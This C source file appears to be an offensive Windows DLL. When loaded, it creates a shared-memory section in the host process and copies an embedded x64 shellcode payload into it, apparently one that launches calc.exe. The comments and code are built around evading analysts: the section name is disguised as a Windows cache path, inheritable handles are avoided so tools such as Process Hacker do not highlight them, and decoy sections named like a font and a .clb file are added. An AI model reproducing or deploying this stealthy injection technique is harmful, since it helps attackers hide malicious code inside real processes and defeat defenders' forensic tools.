/*
* 
* The DLL will create a file mapping in the target process and
* copy our shellcode into it.
* 
*/

#include <windows.h>
#include <stdio.h>

//
// @SHARED_MEM_NAME:
// if this is NULL, you won't see the section in ProcessExplorer at all
// but, the section will still show in process hacker or system informer
// the name column for this section when this parameter is NULL will be
// "Commit (1 MB)" (in this case we allocated 1 MB size of memory), it's
// not so bad because huge process like explorer.exe got many sections
// which has no name, and their names will be rendered all to "Commit (xxx)"
// 
// if this is not NULL, make sure to choose a name that belends in with
// normal convention
//
#define SHARED_MEM_NAME L"C:*ProgramData*Microsoft*Windows*Caches*cversions.9.ro"

unsigned char payload[] = "\x48\x89\xe5\x48\x81\xc4\xf8\xfd\xff\xff\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x20\x48\x8b\x5e\x20\x48\x8b\x7e\x50\x48\x8b\x36\x66\x39\x4f\x18\x75\xef\xeb\x07\x5e\x48\x89\x75\x08\xeb\x64\xe8\xf4\xff\xff\xff\x8b\x43\x3c\x8b\xbc\x03\x88\x00\x00\x00\x48\x01\xdf\x48\x31\xc9\x8b\x4f\x14\x48\x31\xc0\x8b\x47\x20\x48\x01\xd8\x48\x89\x45\x10\x67\xe3\x3b\x48\x8b\x45\x10\x8b\x34\x88\x48\x01\xde\x48\xff\xc9\x48\x31\xc0\x48\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xfa\x75\xd9\x8b\x57\x24\x48\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x48\x01\xda\x8b\x44\x8a\x04\x48\x01\xd8\xc3\x49\xc7\xc7\x83\xb9\xb5\x78\xff\x55\x08\x48\x89\x45\x18\x49\xc7\xc7\x98\xfe\x8a\x0e\xff\x55\x08\x48\x89\x45\x20\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x20\xff\x55\x20\x48\xc7\xc1\xff\xff\xff\xff\x48\x31\xd2\xff\x55\x18";

HANDLE hSharedMem = INVALID_HANDLE_VALUE;

VOID Go()
{
	//
	// create shared memroy, don't use any inheritable properties
	// cause inheritable handles will be marked as cyan in process hacker
	//
#ifdef SHARED_MEM_NAME
	hSharedMem = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20, SHARED_MEM_NAME);
#else
	hSharedMem = CreateFileMapping(INVALID_HANDLE_VALUE, (LPSECURITY_ATTRIBUTES)&lpsa, PAGE_READWRITE, 0, 1 << 20, NULL);
#endif
	if (NULL == hSharedMem)
		return;
	
	//
	// just to mess things up, create as many as you want
	//
	HANDLE hSharedMem1 = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20,	NULL);

	//
	// write to shared memory, map 520+K for data write
	//
	PVOID pMap = MapViewOfFile(hSharedMem, FILE_MAP_WRITE, 0, 0, 2 << 18);
	if (NULL == pMap)
		return;

	// mess things up
	CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20, NULL);

	printf("[*]Shared memory region mapped @ >>>>>>>>> 0x%p\n", pMap);

	// increase handle
	CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20, SHARED_MEM_NAME);

	printf("[*]Size of payload: %I64u\n", sizeof(payload));

	// increase handle, now er have 3 handles to the same section
	// do it as many times as you want, but numbers between 3-15
	// is ok
	CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20, SHARED_MEM_NAME);

	memcpy(pMap, payload, sizeof(payload));

	// mess things up
	CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20, L"R000000000021.clb");

	UnmapViewOfFile(pMap);

	// mess things up
	HANDLE hSharedMem2 = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1 << 20, L"Candara.ttf");
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		Go();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

